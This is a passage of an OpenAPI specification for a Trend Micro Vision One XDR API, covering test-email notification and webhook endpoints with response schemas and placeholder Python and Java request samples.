(contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/notifications/alerts/sendEmails": {
      "post": {
        "tags": [
          "Notifications"
        ],
        "summary": "Send test email notification",
        "description": "Sends a test notification to the specified email address address\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "empty object",
                "type": "object",
                "properties": {
                  "email": {
                    "type": "string",
                    "maxLength": 256
                  }
                },
                "required": [
                  "email"
                ]
              }
            }
          }
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/alerts/sendEmails'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'email': 'YOUR_EMAIL (string)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/alerts/sendEmails\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"email\\\": \\\"YOUR_EMAIL (string)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/notifications/webhooks": {
      "get": {
        "tags": [
          "Webhooks"
        ],
        "summary": "List webhook requests",
        "description": "Retrieves a list of webhook requests sent to company applications\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "totalCount": {
                          "type": "integer"
                        },
                        "items": {
                          "type": "array",
                          "items": {
                            "type": "object",
                            "properties": {
                              "id": {
                                "type": "string",
                                "description": "webhook id of the created webhook request."
                              },
                              "url": {
                                "type": "string",
                                "description": "webhook url while creating webhook request."
                              },
                              "headerData": {
                                "type": "object",
                                "additionalProperties": {
                                  "type": "string"
                                },
                                "description": "webhook header of the webhook request."
                              },
                              "eventType": {
                                "type": "string",
                                "description": "The configuration is used to identify which module it belongs to. e.g. 'workbench'."
                              },
                              "isVerifyingCertificate": {
                                "type": "boolean"
                              },
                              "isGeneratingClientCert": {
                                "type": "boolean"
                              },
                              "publicKey": {
                                "type": "string",
                                "description": "public key content if isGeneratingClientCert is true."
                              }
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks\";\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "post": {
        "tags": [
          "Webhooks"
        ],
        "summary": "Create webhook request",
        "description": "Creates a new webhook request for a specific Trend Vision One app or feature (Note. Any application that supports custom JSON should be able to consume Trend Vision One webhook requests. However, Trend Micro does not guarantee support for all applications and recommends that you test each implementation before use in a production environment.)\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "request body",
                "type": "object",
                "required": [
                  "url",
                  "eventType",
                  "headerData"
                ],
                "properties": {
                  "url": {
                    "type": "string",
                    "maxLength": 1024,
                    "description": "The url of webhook. e.g. 'https://xxxxxx/v2.0/xdr/portal/notifications/webhooks'.\n"
                  },
                  "eventType": {
                    "type": "string",
                    "maxLength": 128,
                    "description": "The configuration is used to identify which module it belongs to. e.g. 'workbench','dddcloud'.\n"
                  },
                  "headerData": {
                    "type": "object",
                    "additionalProperties": {
                      "type": "string",
                      "maxLength": 2048
                    },
                    "description": "The headers will be built in webhook request, and sent to the webhook url address. e.g.\\\n{\\\n  \"x-trace-id\": '00000000-0000-0000-0000-000000000000',\\\n  \"x-customer-id\": '00000000-0000-0000-0000-000000000000',\\\n}\n"
                  },
                  "isVerifyingCertificate": {
                    "type": "boolean",
                    "default": true,
                    "description": "Whether to check the ca of the url of webhook while there is a request to webhook url. If true, the server certificate is verified against the CAs.\n"
                  },
                  "isGeneratingClientCert": {
                    "type": "boolean",
                    "default": false,
                    "description": "Whether to generate client certificate for request authorization, including private key and public key. The private key is used to sign the meassage, and the public key can be used to verify the message.\nIf true, there will be public key in reply, and there will be a header named as \"signature\" to be checked with public key while there is a request to webhook url.\\\nThe header will be a base64 encoded object, customer can base64 decode the header first, and there will be two keys named as \"message\" and \"signature\".\nThe \"message\" is the content to be signed and checked. The \"signature\" key is base64 output format, signed with private key by \"SHA256\" algorithm signer.\\\nCustomer can verify the signature of the message and signature with public key.\n"
                  }
                }
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "code",
                    "message",
                    "data"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "data": {
                      "required": [
                        "webhookId"
                      ],
                      "type": "object",
                      "properties": {
                        "webhookId": {
                          "type": "string",
                          "description": "webhook id"
                        },
                        "publicKey": {
                          "type": "string",
                          "description": "If isGeneratingClientCert is set to be true, there will be private key and public key to be generated, and the public key will be returned back."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks'\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token,\n    'Content-Type': 'application/json;charset=utf-8'\n}\nbody = {\n    'url': 'YOUR_URL (string)',\n    'eventType': 'YOUR_EVENTTYPE (string)',\n    'headerData': 'YOUR_HEADERDATA (object)',\n    'isVerifyingCertificate': 'YOUR_ISVERIFYINGCERTIFICATE (boolean)',\n    'isGeneratingClientCert': 'YOUR_ISGENERATINGCLIENTCERT (boolean)'\n}\n\nr = requests.post(url_base + url_path, params=query_params, headers=headers, json=body)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks\";\n        String token = \"YOUR_TOKEN\";\n\n        String requestyBody = \n                \"{\" +\n                \"    \\\"url\\\": \\\"YOUR_URL (string)\\\",\" +\n                \"    \\\"eventType\\\": \\\"YOUR_EVENTTYPE (string)\\\",\" +\n                \"    \\\"headerData\\\": \\\"YOUR_HEADERDATA (object)\\\",\" +\n                \"    \\\"isVerifyingCertificate\\\": \\\"YOUR_ISVERIFYINGCERTIFICATE (boolean)\\\",\" +\n                \"    \\\"isGeneratingClientCert\\\": \\\"YOUR_ISGENERATINGCLIENTCERT (boolean)\\\"\" +\n                \"}\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.post(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .addHeader(\"Content-Type\", \"application/json;charset=utf-8\")\n                .setEntity(requestyBody, ContentType.APPLICATION_JSON)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      }
    },
    "/v2.0/xdr/portal/notifications/webhooks/{webhook_id}": {
      "get": {
        "tags": [
          "Webhooks"
        ],
        "summary": "Get webhook request information",
        "description": "Retrieves information about a specific webhook request using the webhook ID\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>View</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "webhook_id",
            "in": "path",
            "description": "The webhook id of request in db.",
            "required": true,
            "schema": {
              "type": "string",
              "maxLength": 24
            }
          }
        ],
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "data",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "data": {
                      "type": "object",
                      "properties": {
                        "customerId": {
                          "type": "string"
                        },
                        "url": {
                          "type": "string",
                          "description": "webhook url while creating webhook request."
                        },
                        "headerData": {
                          "type": "object",
                          "additionalProperties": {
                            "type": "string"
                          },
                          "description": "webhook header of the webhook request."
                        },
                        "eventType": {
                          "type": "string",
                          "description": "The configuration is used to identify which module it belongs to. e.g. 'workbench','dddcloud'."
                        },
                        "isVerifyingCertificate": {
                          "type": "boolean"
                        },
                        "isGeneratingClientCert": {
                          "type": "boolean"
                        },
                        "publicKey": {
                          "type": "string",
                          "description": "public key content if isGeneratingClientCert is true."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "400": {
            "description": "The specified parameter is invalid. Review the available parameters for the API request.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InvalidParameter"
                        },
                        "message": {
                          "type": "string"
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "401": {
            "description": "User account failed to pass the authentication of the server.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account Failed to authenticate with the server. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "403": {
            "description": "User account tries to access resources which he does not have permissions.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "Unauthorized"
                        },
                        "message": {
                          "type": "string",
                          "default": "User account has no authorization to access. Please contact your system administrator."
                        }
                      }
                    }
                  }
                }
              }
            }
          },
          "500": {
            "description": "These errors are usually caused by a server-side issue.",
            "content": {
              "*/*": {
                "schema": {
                  "title": "empty object",
                  "required": [
                    "error"
                  ],
                  "type": "object",
                  "properties": {
                    "error": {
                      "required": [
                        "code",
                        "message"
                      ],
                      "type": "object",
                      "properties": {
                        "code": {
                          "type": "string",
                          "default": "InternalServerError"
                        },
                        "message": {
                          "type": "string",
                          "default": "An internal error has occurred. Please contact Trend Micro Support."
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        },
        "x-code-samples": [
          {
            "lang": "Python",
            "source": "import requests\nimport json\n\nurl_base = 'https://api.xdr.trendmicro.com'\nurl_path = '/v2.0/xdr/portal/notifications/webhooks/{webhook_id}'\nurl_path = url_path.format(**{'webhook_id': 'YOUR_WEBHOOK_ID'})\ntoken = 'YOUR_TOKEN'\n\nquery_params = {}\nheaders = {\n    'Authorization': 'Bearer ' + token\n}\n\nr = requests.get(url_base + url_path, params=query_params, headers=headers)\n\nprint(r.status_code)\nfor k, v in r.headers.items():\n    print(f'{k}: {v}')\nprint('')\nif 'application/json' in r.headers.get('Content-Type', '') and len(r.content):\n    print(json.dumps(r.json(), indent=4))\nelse:\n    print(r.text)"
          },
          {
            "lang": "Java",
            "source": "import java.io.IOException;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\nimport org.apache.hc.client5.http.ClientProtocolException;\nimport org.apache.hc.client5.http.impl.classic.CloseableHttpClient;\nimport org.apache.hc.client5.http.impl.classic.HttpClients;\nimport org.apache.hc.core5.http.ClassicHttpRequest;\nimport org.apache.hc.core5.http.ContentType;\nimport org.apache.hc.core5.http.Header;\nimport org.apache.hc.core5.http.HttpEntity;\nimport org.apache.hc.core5.http.HttpHeaders;\nimport org.apache.hc.core5.http.io.entity.EntityUtils;\nimport org.apache.hc.core5.http.io.support.ClassicRequestBuilder;\n\npublic class ApiSample {\n\n    public static void main(String[] args) {\n        String urlBase = \"https://api.xdr.trendmicro.com\";\n        String urlPath = \"/v2.0/xdr/portal/notifications/webhooks/{webhook_id}\";\n        urlPath = urlPath.replace(\"{webhook_id}\", \"YOUR_WEBHOOK_ID\");\n        String token = \"YOUR_TOKEN\";\n\n        ClassicHttpRequest request = ClassicRequestBuilder.get(urlBase + urlPath)\n                .addHeader(HttpHeaders.AUTHORIZATION, \"Bearer \" + token)\n                .build();\n\n        try (CloseableHttpClient httpClient = HttpClients.custom().disableContentCompression().build()) {\n            httpClient.execute(request, response -> {\n                HttpEntity entity = response.getEntity();\n                String contentType = (entity == null) ? \"\" : entity.getContentType();\n                long contentLength = (entity == null) ? 0 : entity.getContentLength();\n                boolean isChunked = (entity == null) ? false : entity.isChunked();\n\n                System.out.println(response.getCode());\n                for (Header header: response.getHeaders()) {\n                    System.out.println(header.getName() + \": \" + header.getValue());\n                }\n                System.out.println();\n                if (0 < contentLength || isChunked) {\n                    if (contentType.contains(\"application/json\")) {\n                        ObjectMapper mapper = new ObjectMapper();\n                        JsonNode jsonResponse = mapper.readTree(EntityUtils.toString(entity, \"UTF-8\"));\n                        System.out.println(mapper.writerWithDefaultPrettyPrinter().writeValueAsString(jsonResponse));\n                    } else {\n                        System.out.println(EntityUtils.toString(entity, \"UTF-8\"));\n                    }\n                }\n                return null;\n            });\n        } catch (ClientProtocolException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n"
          }
        ]
      },
      "put": {
        "tags": [
          "Webhooks"
        ],
        "summary": "Update webhook request information",
        "description": "Updates information about a specific webhook request using the webhook ID\n\n<div class=\"notice-permission\">\n  <b>API key role permissions required:</b><br>\n    <b>Alert Notifications</b><br>\n  <ul>\n    <li>Configure settings</li>\n  </ul>\n\n</div>\n",
        "parameters": [
          {
            "name": "webhook_id",
            "in": "path",
            "description": "The webhook id of request.",
            "required": true,
            "schema": {
              "type": "string",
              "maxLength": 24
            }
          }
        ],
        "requestBody": {
          "content": {
            "application/json": {
              "schema": {
                "title": "request body",
                "type": "object",
                "properties": {
                  "headerData": {
                    "type": "object",
                    "additionalProperties": {
                      "type": "string",
                      "maxLength": 2048
                    },
                    "description": "The headers will be built in webhook request, and sent to the webhook url address. e.g.\\\n{\\\n  \"x-trace-id\": '00000000-0000-0000-0000-000000000000',\\\n  \"x-customer-id\": '00000000-0000-0000-0000-000000000000',\\\n}\n"
                  },
                  "isVerifyingCertificate": {
                    "type": "boolean",
                    "description": "Whether to check the ca of the url of webhook while there is a request to webhook url. If true, the server certificate is verified against the CAs.\n"
                  },
                  "isGeneratingClientCert": {
                    "type": "boolean",
                    "description": "Whether to generate client certificate for request authorization, including private key and public key. The private key is used to sign the meassage, and the public key can be used to verify the message.\nIf true, there will be public key in reply, and there will be a header named as \"signature\" to be checked with public key while there is a request to webhook url.\\\nThe header will be a base64 encoded object, customer can base64 decode the header first, and there will be two keys named as \"message\" and \"signature\".\nThe \"message\" is the content to be signed and checked. The \"signature\" key is base64 output format, signed with private key by \"SHA256\" algorithm signer.\\\nCustomer can verify the signature of the message and signature with public key.\n"
                  }
                }
              }
            }
          },
          "required": true
        },
        "responses": {
          "200": {
            "description": "successful operation",
            "content": {
              "*/*": {
                "schema": {
                  "required": [
                    "code",
                    "message"
                  ],
                  "type": "object",
                  "properties": {
                    "code": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    },
                    "message": {
                      "type": "string",
                      "example": "Success",
                      "default": "Success"
                    }
                  }
                }
              }
            }
          },
          "400": {
